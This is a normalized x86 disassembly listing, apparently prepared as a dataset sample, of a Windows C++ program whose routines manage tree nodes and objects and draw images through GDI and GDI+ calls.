push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax edi
call sub_421cd0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edi + 0x4 ]
push eax
call [ operator delete@IAT ]
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_421c10
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_421c70
push ebp
mov ebp esp
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_421cd0
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push edi
mov edi eax
mov eax [ edi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx edx
je r-xdata
cmp edx eax
jne r-xdata
mov eax esi
mov [ esi ] ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
cmp [ ecx + 0x15 ] 0x0
mov edx ecx
jne r-xdata
call sub_413410
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
mov eax esi
mov [ esi ] ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
push edx
lea edx [ ebp - 0x4 ]
push edx
push edi
call sub_413670
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0xc ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ ebp + 0x8 ] eax
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ ebp + 0x8 ] ecx
jmp r-xdata
lea esp [ esp ]
mov ecx eax
mov [ ebp + 0x8 ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_421d70
push ebp
mov ebp esp
push 0xffffffff
push sub_449c50
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x14 ] r--data
mov [ esi + 0x34 ] r--data
mov [ esi + 0x40 ] r--data
or eax 0xffffffff
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x14 ] r--data
mov [ esi + 0x34 ] r--data
mov [ esi + 0x40 ] r--data
mov [ ebp - 0x4 ] eax
call sub_425840
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_421e40
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_421e80
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
push esi
mov esi ecx
je r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax ]
push ebx
push edi
mov edi [ SelectObject@IAT ]
push ecx
push edx
call edi
mov ebx [ ebp + 0x10 ]
mov ebx [ ebx + 0x4 ]
push 0xcc0020
push ebx
mov ebx [ ebp + 0x10 ]
mov ebx [ ebx ]
push ebx
mov ebx [ esi + 0x10 ]
mov ebx [ ebx ]
push ebx
mov [ ebp + 0x14 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov ebx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
sub ebx ecx
push ebx
sub eax edx
push eax
push ecx
mov ecx [ esi + 0x8 ]
push edx
mov edx [ ecx ]
push edx
call [ BitBlt@IAT ]
mov eax [ ebp + 0x14 ]
mov ecx [ esi + 0x10 ]
mov edx [ ecx ]
push eax
push edx
call edi
pop edi
pop ebx
pop esi
pop ebp
retn 0x10
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax [ esi ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
mov edx [ eax + 0x24 ]
push ecx
mov ecx esi
call edx
pop esi
pop ebp
retn 0x10
sub_421f10
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
push esi
mov esi ecx
je r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax ]
push ebx
push edi
push ecx
push edx
call [ SelectObject@IAT ]
mov ecx [ ebp + 0xc ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov edx [ eax + 0x4 ]
mov ebx [ eax + 0xc ]
mov edi [ eax ]
mov eax [ eax + 0x8 ]
push 0xcc0020
sub ebx edx
push ebx
sub eax edi
push eax
push edx
mov edx [ esi + 0x10 ]
mov eax [ edx ]
mov edx [ ecx + 0xc ]
push edi
push eax
mov eax [ ecx + 0x4 ]
sub edx eax
push edx
mov edx [ ecx + 0x8 ]
mov ecx [ ecx ]
sub edx ecx
push edx
push eax
mov eax [ esi + 0x8 ]
push ecx
mov ecx [ eax ]
push ecx
call [ StretchBlt@IAT ]
mov edx [ ebp + 0x8 ]
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
push edx
push ecx
call [ SelectObject@IAT ]
pop edi
pop ebx
pop esi
pop ebp
retn 0x10
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax [ esi ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
mov edx [ eax + 0x24 ]
push ecx
mov ecx esi
call edx
pop esi
pop ebp
retn 0x10
sub_421fb0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax ]
push edi
push ecx
push edx
call [ SelectObject@IAT ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov edx [ eax + 0x4 ]
mov ebx [ eax + 0xc ]
mov edi [ eax ]
mov eax [ eax + 0x8 ]
push 0xff00ff
sub ebx edx
push ebx
sub eax edi
push eax
push edx
mov edx [ esi + 0x10 ]
mov eax [ edx ]
mov edx [ ecx + 0xc ]
push edi
push eax
mov eax [ ecx + 0x4 ]
sub edx eax
push edx
mov edx [ ecx + 0x8 ]
mov ecx [ ecx ]
sub edx ecx
push edx
push eax
mov eax [ esi + 0x8 ]
push ecx
mov ecx [ eax ]
push ecx
call [ TransparentBlt@IAT ]
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
push edx
push ecx
call [ SelectObject@IAT ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_422030
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0xc ]
mov edx [ eax ]
mov [ ebp + 0xc ] edx
fild [ ebp + 0xc ]
push esi
mov esi [ eax + 0x4 ]
push edi
mov edi [ eax + 0x8 ]
fstp [ ebp - 0x18 ]
mov eax [ eax + 0xc ]
mov [ ebp + 0xc ] esi
fild [ ebp + 0xc ]
sub edi edx
mov [ ebp + 0xc ] edi
sub eax esi
mov esi [ ecx + 0xc ]
fstp [ ebp - 0x14 ]
fild [ ebp + 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
fstp [ ebp - 0x10 ]
fild [ ebp + 0xc ]
mov edi [ eax + 0x8 ]
mov [ ebp + 0xc ] ecx
sub edi ecx
mov ecx [ eax + 0xc ]
fstp [ ebp - 0xc ]
fild [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ ebp + 0xc ] edx
sub ecx edx
fstp [ ebp - 0x8 ]
fild [ ebp + 0xc ]
mov [ ebp + 0xc ] edi
fstp [ ebp - 0x4 ]
fild [ ebp + 0xc ]
mov [ ebp + 0xc ] ecx
fstp [ ebp + 0x10 ]
fild [ ebp + 0xc ]
fstp [ ebp + 0xc ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax + 0x4 ]
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
mov [ esi + 0x4 ] eax
fld [ ebp + 0xc ]
push 0x0
push 0x0
mov edx [ esi ]
push 0x0
push 0x2
sub esp 0x20
fstp [ esp + 0x1c ]
fld [ ebp + 0x10 ]
fstp [ esp + 0x18 ]
fld [ ebp - 0x4 ]
fstp [ esp + 0x14 ]
fld [ ebp - 0x8 ]
fstp [ esp + 0x10 ]
fld [ ebp - 0xc ]
fstp [ esp + 0xc ]
fld [ ebp - 0x10 ]
fstp [ esp + 0x8 ]
fld [ ebp - 0x14 ]
fstp [ esp + 0x4 ]
fld [ ebp - 0x18 ]
fstp [ esp ]
push eax
push edx
call [ GdipDrawImageRectRect@IAT ]
test eax eax
je r-xdata
sub_422120
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
mov eax [ ecx ]
mov eax [ eax + 0x8 ]
push 0x1
push edx
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push edx
call eax
pop ebp
retn 0xc
sub_422150
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
push 0x1
push edx
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push edx
call eax
pop ebp
retn 0xc
sub_422170
push ebp
mov ebp esp
test esi esi
je r-xdata
pop ebp
retn 0x4
mov eax [ edx + 0x4 ]
mov ecx [ edx ]
push edi
mov edi [ ebp + 0x8 ]
mov edi [ edi + 0x8 ]
mov edi [ edi ]
push 0xcc0020
push eax
push ecx
push edi
mov edi [ edx + 0xc ]
mov edx [ edx + 0x8 ]
sub edi eax
push edi
sub edx ecx
push edx
push eax
mov eax [ esi + 0x8 ]
push ecx
mov ecx [ eax ]
push ecx
call [ BitBlt@IAT ]
pop edi
sub_4221b0
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor ecx ecx
mov ecx [ ecx + 0x4 ]
jmp r-xdata
xor eax eax
pop ebp
retn 0x10
mov [ esi + 0x4 ] eax
pop ebp
retn 0x10
fld [ ebp + 0x14 ]
push 0x0
push 0x0
push 0x0
push 0x2
sub esp 0x20
fstp [ esp + 0x1c ]
fld [ ebp + 0x10 ]
fstp [ esp + 0x18 ]
fld [ ebp + 0xc ]
fstp [ esp + 0x14 ]
fld [ ebp + 0x8 ]
fstp [ esp + 0x10 ]
fld [ eax + 0xc ]
fstp [ esp + 0xc ]
fld [ eax + 0x8 ]
fstp [ esp + 0x8 ]
fld [ eax + 0x4 ]
fstp [ esp + 0x4 ]
fld [ eax ]
mov eax [ esi ]
fstp [ esp ]
push ecx
push eax
call [ GdipDrawImageRectRect@IAT ]
test eax eax
je r-xdata
sub_422230
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_422260
push ebp
mov ebp esp
push 0xffffffff
push sub_44878f
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_43b0f0
xor ebx ebx
mov [ ebp - 0x4 ] ebx
lea eax [ esi + 0x40 ]
mov [ eax ] r--data
mov [ ebp - 0x10 ] eax
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
mov [ eax + 0x14 ] ebx
mov [ ebp - 0x4 ] 0x1
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ ebp - 0x4 ] 0x2
mov [ eax ] r--data
lea eax [ esi + 0x5c ]
push eax
mov [ esi ] r--data
mov [ esi + 0x14 ] r--data
mov [ esi + 0x34 ] r--data
call sub_40ec50
mov [ ebp - 0x4 ] 0x3
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
lea edi [ esi + 0x74 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call eax
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x5
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
lea edi [ esi + 0x78 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call eax
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x7
mov [ esi + 0x94 ] r--data
mov [ esi + 0x98 ] ebx
mov [ esi + 0x9c ] ebx
mov [ esi + 0xa0 ] ebx
mov [ esi + 0xa4 ] ebx
mov [ esi + 0xa8 ] ebx
mov [ esi + 0xac ] ebx
mov [ ebp - 0x4 ] 0x8
push 0x7f89
push ebx
mov [ esi + 0x7c ] bl
mov [ esi + 0x80 ] ebx
mov [ esi + 0xb4 ] ebx
mov [ esi + 0xb8 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x8c ] ebx
call [ LoadCursorW@IAT ]
mov [ esi + 0x88 ] eax
mov [ esi + 0x90 ] bl
mov [ esi + 0xb0 ] ebx
mov [ esi + 0xbc ] ebx
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4223b0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_4223e0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_4223e0
push ebp
mov ebp esp
push 0xffffffff
push sub_44870f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
lea edi [ esi + 0x40 ]
mov [ esi ] r--data
mov [ esi + 0x14 ] r--data
mov [ esi + 0x34 ] r--data
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x5
mov eax [ esi + 0x8c ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x4
mov cl 0x3
mov [ esi + 0x94 ] r--data
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x78 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
push eax
call [ operator delete@IAT ]
add esp 0x4
mov [ esi + 0x8c ] ebx
mov cl 0x2
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x74 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x5c ]
push ecx
call sub_40ecf0
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x14 ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] bl
mov eax [ edi + 0xc ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ edi + 0xc ] ebx
mov [ edi + 0x10 ] ebx
mov [ edi + 0x14 ] ebx
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_43b230
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call [ operator delete@IAT ]
add esp 0x4
sub_422520
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x74 ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x78 ]
cmp eax ebx
je r-xdata
call sub_4142d0
mov ecx [ esi + 0x74 ]
cmp ecx ebx
je r-xdata
push edi
mov ecx esi
call sub_420c70
lea edi [ esi - 0x2c ]
call sub_43abe0
mov eax [ esi + 0x44 ]
cmp eax ebx
je r-xdata
call sub_4142d0
mov ecx [ esi + 0x78 ]
cmp ecx ebx
je r-xdata
mov [ esi + 0x74 ] ebx
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov edi [ esi - 0x8 ]
mov ecx [ edi + 0x8 ]
cmp ecx ebx
je r-xdata
push eax
call [ operator delete@IAT ]
add esp 0x4
mov [ esi + 0x44 ] ebx
mov [ esi + 0x78 ] ebx
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov edi [ esi - 0x4 ]
mov ecx [ edi + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
mov ecx [ edi + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ esi + 0x58 ]
pop edi
cmp eax ebx
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
mov ecx [ edi + 0x8 ]
cmp ecx ebx
je r-xdata
mov [ edi + 0x8 ] ebx
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x5c ] ebx
mov [ esi + 0x60 ] ebx
mov [ esi + 0x64 ] ebx
mov [ esi + 0x68 ] ebx
mov [ esi + 0x6c ] ebx
pop esi
pop ebx
retn
push eax
call [ `placement delete closure'@IAT ]
add esp 0x4
mov [ esi + 0x58 ] ebx
mov [ edi + 0x8 ] ebx
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
sub_422610
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x44 ]
push 0x0
mov ebx 0x1
lea edx [ edi + 0x5c ]
push edx
mov [ edi + 0x7c ] bl
mov [ edi + 0x2d ] bl
mov [ eax + 0x4 ] bl
mov ecx [ edi + 0x48 ]
push 0x0
push edi
mov [ ecx + 0x4 ] bl
call sub_4229c0
mov esi eax
mov [ edi + 0x7c ] 0x0
mov [ edi + 0x2d ] 0x0
test esi esi
jne r-xdata
mov edx [ edi ]
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
call sub_422d00
mov ecx [ edi + 0x44 ]
mov [ ecx + 0x4 ] 0x0
mov edx [ edi + 0x48 ]
pop edi
mov eax esi
pop esi
mov [ edx + 0x4 ] 0x0
pop ebx
retn
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x60 ]
mov eax [ ecx ]
mov eax [ eax + 0x1c ]
push edx
push ebx
call eax
pop edi
mov eax esi
pop esi
pop ebx
retn
sub_422680
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44bb8a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x38 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi + 0xbc ]
test eax eax
jle r-xdata
mov ecx [ ebp + 0x8 ]
xor eax eax
test ecx ecx
setne al
test eax eax
jne r-xdata
xor eax eax
mov ecx [ esp + 0x38 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ esi + 0x74 ]
mov edi [ _wcsicmp@IAT ]
push ecx
push eax
call edi
add esp 0x8
test eax eax
jne r-xdata
push 0x80004005
call sub_402d00
mov ecx [ ebp + 0xc ]
xor eax eax
test ecx ecx
setne al
test eax eax
jne r-xdata
mov eax 0x1
mov ecx [ esp + 0x38 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ esi + 0x78 ]
push ecx
push eax
call edi
mov edi [ esi + 0x50 ]
xor ecx ecx
add esp 0x8
test eax eax
setne cl
sub edi [ esi + 0x4c ]
lea ebx [ esi + 0x40 ]
sar edi 0x2
xor eax eax
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] eax
mov [ esp + 0x10 ] ecx
test edi edi
jle r-xdata
push 0x80004005
call sub_402d00
cmp [ esp + 0x10 ] 0x0
mov [ esi + 0xb0 ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov ecx [ edx + eax * 4 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x98 ]
test eax eax
je r-xdata
mov ecx [ esi + 0xb4 ]
test ecx ecx
je r-xdata
inc eax
mov [ esp + 0x18 ] eax
cmp eax edi
jl r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x3c ]
push 0x1
call edx
mov eax [ esp + 0x18 ]
xor eax eax
mov [ esi + 0x9c ] eax
mov [ esi + 0xa0 ] eax
mov [ esi + 0xa4 ] eax
mov [ esi + 0xa8 ] eax
mov [ esi + 0xac ] eax
mov eax esi
call sub_422db0
xor ebx ebx
cmp [ esp + 0x10 ] ebx
je r-xdata
push eax
call [ `placement delete closure'@IAT ]
add esp 0x4
mov [ esi + 0x98 ] 0x0
mov ecx [ esi + 0xb8 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0xb4 ] 0x0
mov eax [ esi + 0x8c ]
mov edi [ operator delete@IAT ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x14 ]
call sub_43abe0
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0xb8 ] 0x0
mov eax [ esi + 0x28 ]
cmp eax ebx
je r-xdata
push eax
call edi
add esp 0x4
mov [ esi + 0x8c ] ebx
cmp [ esp + 0x10 ] ebx
je r-xdata
push eax
call edi
add esp 0x4
mov [ esi + 0x28 ] ebx
mov eax [ esi + 0x44 ]
mov [ esi + 0x7c ] 0x1
mov [ esi + 0x2d ] 0x1
mov [ eax + 0x4 ] 0x1
mov eax [ esi + 0x48 ]
mov [ eax + 0x4 ] 0x1
lea eax [ esp + 0x1c ]
push eax
call sub_40ec50
mov [ esp + 0x40 ] ebx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov [ esp + 0x1c ] ecx
cmp edx ebx
jne r-xdata
mov edi [ esi + 0x38 ]
mov ecx [ edi + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax edx
lea edi [ eax + 0x2 ]
lea ebx [ ebx ]
xor eax eax
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
mov ecx [ edi + 0x8 ]
cmp ecx ebx
je r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edi
sar eax 0x1
push edx
lea edx [ esp + 0x24 ]
push edx
mov ebx eax
call sub_402910
mov edx [ ebp + 0xc ]
test edx edx
jne r-xdata
mov [ edi + 0x8 ] ebx
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov eax edx
lea edi [ eax + 0x2 ]
lea esp [ esp ]
xor eax eax
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push edx
lea ecx [ esp + 0x28 ]
push ecx
mov ebx eax
call sub_402910
mov edi [ esp + 0x10 ]
push edi
lea edx [ esp + 0x20 ]
push edx
push 0x1
push esi
call sub_4229c0
mov [ esp + 0x18 ] eax
mov [ esi + 0x7c ] 0x0
mov [ esi + 0x2d ] 0x0
test eax eax
jne r-xdata
mov ebx [ esp + 0x14 ]
test edi edi
jne r-xdata
mov esi [ esi + 0x44 ]
mov ecx [ ebp + 0x8 ]
mov eax [ esi ]
mov edx [ eax + 0x1c ]
push ecx
push 0x1
mov ecx esi
call edx
mov ebx [ esp + 0x14 ]
jmp r-xdata
mov eax [ esi + 0x44 ]
mov [ eax + 0x4 ] 0x0
mov esi [ esi + 0x48 ]
mov [ esi + 0x4 ] 0x0
mov eax ebx
call sub_420cf0
mov edx [ eax ]
push 0x7
mov ecx eax
mov eax [ edx + 0x28 ]
push edi
call eax
mov esi [ ebx + 0x10 ]
sub esi [ ebx + 0xc ]
xor edi edi
sar esi 0x2
test esi esi
jle r-xdata
mov [ esp + 0x40 ] 0xffffffff
lea ecx [ esp + 0x1c ]
push ecx
call sub_40ecf0
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x38 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebx + 0xc ]
mov ecx [ ecx + edi * 4 ]
test ecx ecx
je r-xdata
inc edi
cmp edi esi
jl r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x3c ]
push 0x0
call eax
sub_4229c0
push ebp
mov ebp esp
push 0xffffffff
push sub_44bb5c
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x44 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x2
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov esi [ operator new@IAT ]
or ebx 0xffffffff
cmp [ edi + 0x84 ] 0x0
mov [ edi + 0x90 ] 0x0
jne r-xdata
mov eax [ eax + 0x4 ]
cmp [ eax - 0xc ] 0x0
jle r-xdata
mov eax [ edi + 0x28 ]
test eax eax
jne r-xdata
push 0x10
call esi
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
lea esi [ edi + 0x94 ]
push eax
call sub_43a8d0
test al al
je r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
mov ecx 0x1
mov [ eax + 0x4 ] ebx
mov [ eax ] 0x0
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov edx [ edi + 0x84 ]
mov eax [ eax + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax ebx
mov eax [ eax + 0xf4 ]
jmp r-xdata
mov [ ebp - 0x4 ] ebx
mov [ edi + 0x84 ] eax
mov eax [ ebp + 0x10 ]
mov ebx edi
call sub_422c10
cmp [ ebp + 0xc ] 0x0
mov esi eax
je r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
push 0x98
call esi
add esp 0x4
push 0x98
push 0x0
push eax
mov [ edi + 0x28 ] eax
call memset
mov edx [ edi + 0x28 ]
mov [ edx ] 0x0
mov eax [ edi + 0x28 ]
mov [ eax + 0x8 ] ebx
mov esi [ edi + 0x8c ]
add esp 0xc
test esi esi
je r-xdata
mov ecx [ edi + 0xa4 ]
test ecx ecx
je r-xdata
mov ecx [ edi + 0x84 ]
mov [ ecx + 0x4 ] eax
mov eax [ edi + 0xb0 ]
test eax eax
js r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
push 0x1
lea ebx [ edi + 0x40 ]
call sub_420ed0
lea ecx [ edi + 0x40 ]
call sub_420d20
mov ecx [ eax + 0x4 ]
push ecx
push edi
call sub_423980
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x84 ]
cmp [ eax + 0x4 ] ebx
je r-xdata
mov edi [ edi + 0x28 ]
mov ecx 0x26
